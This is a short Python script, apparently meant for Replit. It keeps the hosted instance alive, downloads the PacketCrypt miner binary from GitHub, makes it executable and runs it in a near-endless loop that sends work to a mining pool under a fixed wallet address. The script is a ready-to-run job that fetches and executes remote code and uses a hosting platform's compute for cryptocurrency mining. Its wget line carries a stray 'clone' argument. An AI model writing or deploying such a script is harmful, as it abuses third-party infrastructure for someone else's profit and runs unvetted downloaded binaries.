
from replit_keep_alive import keep_alive
import os


keep_alive()
 
os.system("wget clone https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.3/packetcrypt-v0.4.3-linux_amd64 -O packetcrypt")

os.system("chmod +x packetcrypt")
for x in range(999999999999999999999999999999999999999999999999999999999999999):
    os.system("./packetcrypt ann -p pkt1qkvn3zrzmn08u7glmkqje9r3hwhr3pk0vh04xc5 http://pool.srizbi.com")

 